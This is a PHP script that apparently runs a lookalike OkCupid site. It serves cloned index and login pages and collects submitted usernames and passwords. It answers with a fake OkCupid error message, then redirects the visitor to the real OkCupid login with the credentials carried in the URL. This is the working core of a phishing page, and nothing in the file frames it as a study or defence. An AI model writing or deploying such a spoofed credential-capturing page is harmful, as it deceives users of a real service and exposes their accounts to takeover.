<?php

  session_start();

  if (substr(strtolower($_SERVER['HTTP_HOST']), 0, 4) != 'www.') die(header('Location: https://www.' . parse_url('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], PHP_URL_HOST)));
    
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $username = $_REQUEST['username'];
    $password = $_REQUEST['password'];
    
    $_SESSION['redir'] = "https://www.okcupid.com/login?username=" . urlencode($username) . "&password=" . urlencode($password);
    
    echo '{"actionable" : false, "status" : 0, "success_page" : "/home", "oauth_accesstoken" : "", "userid" : "", "status_str" : "Sorry, Staff Robot had a meltdown\u2014check back later", "screenname" : "", "thumbnail" : "", "show_alist_box" : null}';
    die;
  }
  
  if ($_SERVER['REQUEST_URI'] == "/") die(readfile(__DIR__ . "/okc_index.html"));
  
  if (preg_match("/^\/login(.*)/i", $_SERVER['REQUEST_URI'])) die(readfile(__DIR__ . "/okc_login.html"));

  if (preg_match("/^\/home(.*)/i", $_SERVER['REQUEST_URI'])) {
    die(header("Location: " . $_SESSION['redir']));
  }
  
  die(header("Status: 204 No Content"));